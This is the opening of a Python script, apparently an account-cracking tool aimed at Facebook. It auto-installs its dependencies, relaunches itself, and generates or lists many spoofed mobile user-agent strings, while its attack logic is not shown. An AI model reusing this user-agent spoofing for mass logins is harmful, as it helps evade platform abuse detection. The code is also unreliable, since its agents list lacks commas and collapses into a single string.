#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python AHMED-BILAL.py')
	ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 12;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='es-es; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    #ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 12; es-es; Redmi Note 11 Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn
#Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 
    aa='Mozilla/5.0 (Linux; U; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['pt-br; Redmi Note 10 Pro Max'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/112.0.5615.136 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    
  ###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 11; SM-A525F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 11; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'
ua_nokia   = 'Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36'
ua_xiaomi  = 'Mozilla/5.0 (Linux; U; Android 10; en-us; M2004J19C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36'
ua_oppo    = 'Mozilla/5.0 (Linux; arm_64; Android 10; CPH2125) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 10; V2099A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.88 Mobile Safari/537.36'
ua_iphone  = 'Safari: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 7 Build/MOB30X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
ua_lenovo  = 'Mozilla/5.0 (Linux; Android 10; Lenovo L78032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/57.1.2830.52480'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.1.0; i15 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36'
agents = ['Dalvik/2.1.0 (Linux; U; Android 7.1.2; TA-1033 Build/N2G47H)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7102 Build/KOT49H)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7105 Build/KOT49H)'
'Dalvik/2.1.0 (Linux; U; Android 7.1.1; E5823 Build/32.4.A.1.54)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; HT50 Build/NRD90M)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900FD Build/MMB29M)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo A2010-a Build/LMY47D)'
'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G965F Build/R16NW)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J727V Build/NRD90M)'
'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X MIUI/V9.5.4.0.NAMMIFA)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G920F Build/LMY47X)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30L Build/LenovoTB2-X30L)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V9.5.1.0.MBFMIFA)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320FN Build/LMY47V)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J530F Build/NRD90M)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; Tasty Build/LMY47D)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo P1ma40 Build/LMY47D)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; TIT-L01 Build/HONORTIT-L01)'
'Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9082 Build/JZO54K)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; 3G NOTE XL Build/KOT49H)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.1.6.0.MBFMIDI)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920K Build/NRD90M)'
'Dalvik/2.1.0 (Linux; U; Android 8.1.0; ONEPLUS A5000 Build/OPM1.171019.011)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo B8080-F Build/KVT49L)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; MotoG3 Build/MPIS24.65-33.1-2-16)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 3 MIUI/V8.2.2.0.MHOMIDL)'
'Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-S7272 Build/JDQ39)'
'Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9300 Build/JZO54K)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; HTC One_M8 Eye Build/MMB29M)'
'Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9500 Build/JDQ39)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z010D Build/MMB29P)'
'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4A MIUI/V9.2.6.0.NCCMIEK)'
'Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I8552 Build/JZO54K)'
'Dalvik/1.4.0 (Linux; U; Android 2.3.4; GT-S5670 Build/GINGERBREAD)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; K4000_PRO Build/LMY47D)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.5.6.0.MBFMIED)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A510F Build/MMB29K)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGLS665 Build/LMY47V)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; Moto G (4) Build/NPJS25.93-14-4)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 4 MIUI/8.4.19)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A510F Build/NRD90M)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; T03 Build/LMY47D)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J111F Build/LMY47V)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00J Build/KVT49L)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; LEAGOO M8 Build/MRA58K)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; KOB-L09 Build/HUAWEIKOB-L09)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N920T Build/NRD90M)'
'Dalvik/1.4.0 (Linux; U; Android 2.3.5; IQ239 Build/MocorDroid2.3.5)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; Lenovo TB3-710I Build/LMY47I)'
'Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto G (5S) Plus Build/NPSS26.116-61-5)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; LG-K430 Build/MRA58K)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; BV7000 PRO Build/MRA58K)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532F Build/MMB29T)'
'Dalvik/2.1.0 (Linux; U; Android 5.1; AP-107G Build/LMY47I)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo P780 Build/KOT49H)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; ZTE BLADE A610C Build/MRA58K)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.4; XT1080 Build/SU6-7.7)'
'Dalvik/1.6.0 (Linux; U; Android 5.1.1; Nexus 6 Build/LRX21M)'
'Dalvik/2.1.0 (Linux; U; Android 8.0.0; MIX 2S MIUI/V9.5.15.0.ODGCNFA)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V)'
'Dalvik/2.1.0 (Linux; U; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; DLI-TL20 Build/HONORDLI-TL20)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi 3S MIUI/V9.5.5.0.MALMIFA)'
'Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-D724 Build/LRX22G)'
'Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-S5310 Build/JZO54K)'
'Dalvik/1.6.0 (Linux; U; Android 4.2.2; AP-721 Build/JDQ39)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900F Build/MMB29M)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; T5c Build/NRD90M)'
'Dalvik/1.6.0 (Linux; U; Android 4.3; GT-I9300 Build/JSS15J)'
'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J200H Build/LMY48B)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; D6503 Build/23.5.A.0.575)'
'Dalvik/1.6.0 (Linux; U; Android 4.2.2; S-TELL M210 Build/JDQ39)'
'Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9105 Build/JDQ39)'
'Dalvik/2.1.0 (Linux; U; Android 5.0.1; Lenovo TB3-710F Build/LRX21M)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; NEXBOX-A95X Build/NEXBOX-A95X-RTL8723BS)'
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; LS-4505 Build/MMB29M)'
'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G390F Build/NRD90M)'
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; 4027D Build/KOT49H)'
'Mozilla/5.0 (Linux; Android 13; CPH2213) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.2 Chrome/101.0.4951.41 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; CPH2213 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; CPH2213 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141'
'Mozilla/5.0 (Linux; U; Android 11; CPH2213 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PBEM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/10.5.0.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5'
'Mozilla/5.0 (Linux; U; Android 9; en-us; CPH1859 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'Mozilla/5.0 (Linux; U; Android 5.1; en-gb; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-au; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5'
'Mozilla/5.0 (Linux; U; Android 6.0; en-gb; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'Mozilla/5.0 (Linux; U; Android 6.0; en-us; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.1'
'Mozilla/5.0 (Linux; U; Android 13; en; V2219A Api/TP1A.220624.014) AppleWebKit/534.30 (KHTML, like Gecko) Version/5.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 13; zh-cn; V2072A Build/TP1A.220624.014) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 9; zh-cn; V1901A Build/P00610) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 12; zh-cn; PGP110 Build/SKQ1.220303.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 10; zh-cn; RMX2200 Build/QP1A.190711.020) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 11; zh-cn; V2012A Build/RP1A.200720.012) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 7.1.2; zh-cn; INPAD101S Build/IHv3.4.9) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 10; zh-cn; PCT-AL10 Build/HUAWEIPCT-AL10) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 10; zh-cn; TAS-AN00 Build/HUAWEITAS-AN00) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; k80_bsp Build/O11019) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 11; zh-cn; M2007J22C Build/RP1A.200720.011) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 5.0; ru-ru; SCH-I535PP Build/LRX21T) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.16'
'Mozilla/5.0 (Linux; U; Android 9; zh-cn; Redmi 8A Build/PKQ1.190319.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 10; zh-cn; MI 8 Lite Build/QKQ1.190910.002) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 10; zh-cn; PDVM00 Build/QKQ1.200614.002) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 10; zh-cn; HLK-AL00 Build/HONORHLK-AL00) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; INBOX712 Build/IHv2.3.1.wechat) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 5.0; ru-ru; SM-G9008V Build/LRX21T) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.16'
'Mozilla/5.0 (Linux; U; Android 5.0; ru-ru; SM-G9009W Build/LRX21T) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.16'
'Mozilla/5.0 (Linux; U; Android 5.0; ru-ru; SM-G900L Build/LRX21T) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_DesireHD_A9191; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_Sensation_Z710e; en-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_Flyer_P512; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_EVO3D_X515m; en-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Linux; U; Android 5.0; ru-ru; SM-G900K Build/LRX21T) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.16'
'Mozilla/5.0 (Linux; U; Android 5.0; ru-ru; SM-G9006W Build/LRX21T) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.16'
'Mozilla/5.0 (Linux; Android 13; TECNO BG6 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 9; en-us; CPH1933 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.9'
'Mozilla/5.0 (Linux; U; Android 9; zh-cn; PCLM10 Build/PKQ1.190626.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/20.5.0.9'
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1853 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'mozilla/5.0 (linux; u; android 8.1.0; zh-cn; pbem00 build/opm1.171019.026) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/70.0.3538.80 mobile safari/537.36 oppobrowser/10.6.2.2'
'mozilla/5.0 (linux; u; android 8.1.0; zh-cn; padt00 build/o11019) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/70.0.3538.80 mobile safari/537.36 oppobrowser/10.6.2.2'
'mozilla/5.0 (linux; u; android 8.1.0; zh-cn; pbcm10 build/opm1.171019.011) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/70.0.3538.80 mobile safari/537.36 oppobrowser/10.6.2.2'
'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.4'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.4'
'Mozilla/5.0 (Linux; U; Android 9; en-us; CPH1937 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.9'
'Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/10.6.3.2'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.4'
'Mozilla/5.0 (Linux; U; Android 9; fr-fr; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10'
'Mozilla/5.0 (Linux; U; Android 9; en-us; PACT00 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/10.6.3.2'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1809 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.1'
'Mozilla/5.0 (Linux; U; Android 5.1; en-us; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'Mozilla/5.0 (Linux; Android 13; TECNO BG6 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.194 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 13; TECNO KJ6 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.102 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; TECNO KC1h Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.0; ru-ru; SM-T531 Build/LRX21T) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_IncredibleS_S710e; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_EVO3D_X515m; ru-by) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_Sensation_Z710e; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; Build/LRX21M ) AppleWebKit/534.30 (KHTML,like Gecko) Version/5.0.2 Mobile Safari/534.30'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_Flyer_P510e; en-gb) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_EVO3D_X515m; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_Flyer_P510e; ru-ua) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_Flyer_P510e; ru-) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; HTC_Flyer_P510e; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-gb; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.1'
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1'
